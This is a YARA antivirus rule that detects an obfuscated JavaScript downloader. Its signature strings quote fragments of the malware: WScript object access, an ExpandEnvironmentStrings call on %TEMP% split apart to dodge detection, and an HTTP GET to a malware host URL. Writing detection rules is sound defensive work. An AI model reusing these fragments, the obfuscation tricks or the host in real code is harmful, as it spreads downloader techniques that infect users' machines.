rule sig_20160428_e96658601204861ae9070d9cd7e0153f {
  meta:
    description = "datamaliciousorder - file 20160428_e96658601204861ae9070d9cd7e0153f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b6528e93e9dc8f0c8e2e86060c1d7e0ff59089fbef0a68d4e7176b89d7546f79"

  strings:
    $s1  = "function GnbQkiLraTuvGhjGvtOxb(EvoUbmMakRymGbgDmbZun){MtrYtjXraTzvQvzQkqYlq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function UymArkBefRxwDciKmgNxk() {return MtrYtjXraTzvQvzQkqYlq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function GnbQkiLraTuvGhjGvtOxb(EvoUbmMakRymGbgDmbZun){MtrYtjXraTzvQvzQkqYlq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function YldXxyBqvTlvSicOerSuw(YyxMavSbtWbuOebSpwHsn, HfbYvoOhcNtbWcrEfeWwm){VoaVbmVahEmdZauHidHel = VoaVbmVahEmdZauHidHel * 1; " ascii
    $s5  = "var MtrYtjXraTzvQvzQkqYlq = function PhuBqqSeuPnnBngOueKju() {return GggJwnSczAuvPjtOgoPxv[UnyWygKmrRqeOtzJtbEdn](\"WScript\"+\"" ascii
    $s6  = "return YyxMavSbtWbuOebSpwHsn - HfbYvoOhcNtbWcrEfeWwm;};" fullword ascii
    $s7  = "KsfHymNgbFgdXsiKlhWbm[UaiPgcCtnGjwFjvMmzRgx](\"G\" + \"ET\", \"http://banketcentr.ru/v8usja\", false);" fullword ascii
    $s8  = "function ShuKsfBgfOhdHslMsrDkq() {return ((LnrAdiVszRybEfyDaiGml == true) && (LnrAdiVszRybEfyDaiGml == CcbZeiIxaComUkzOteEko)) ?" ascii
    $s9  = "function ShuKsfBgfOhdHslMsrDkq() {return ((LnrAdiVszRybEfyDaiGml == true) && (LnrAdiVszRybEfyDaiGml == CcbZeiIxaComUkzOteEko)) ?" ascii
    $s10 = "var MtrYtjXraTzvQvzQkqYlq = function PhuBqqSeuPnnBngOueKju() {return GggJwnSczAuvPjtOgoPxv[UnyWygKmrRqeOtzJtbEdn](\"WScript\"+\"" ascii
    $s11 = "var GggJwnSczAuvPjtOgoPxv = this[\"WScript\"];" fullword ascii
    $s12 = "function UymArkBefRxwDciKmgNxk() {return MtrYtjXraTzvQvzQkqYlq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s13 = "function UmaRueZbfDdgTglNsgCgt(){return KinDmhSztVkhRasLaeTmz + \"\";};" fullword ascii
    $s14 = "if (KsfHymNgbFgdXsiKlhWbm[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s15 = "function YldXxyBqvTlvSicOerSuw(YyxMavSbtWbuOebSpwHsn, HfbYvoOhcNtbWcrEfeWwm){VoaVbmVahEmdZauHidHel = VoaVbmVahEmdZauHidHel * 1; " ascii
    $s16 = "CcbZeiIxaComUkzOteEko = true; " fullword ascii
    $s17 = "var CcbZeiIxaComUkzOteEko = false;" fullword ascii
    $s18 = "function MmdAkyCjzQddYtuBpsGqr(){return UnyWygKmrRqeOtzJtbEdn;};" fullword ascii
    $s19 = "}while (PemJiwQrpMpwSitNldSwl);" fullword ascii
    $s20 = "LnrAdiVszRybEfyDaiGml = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}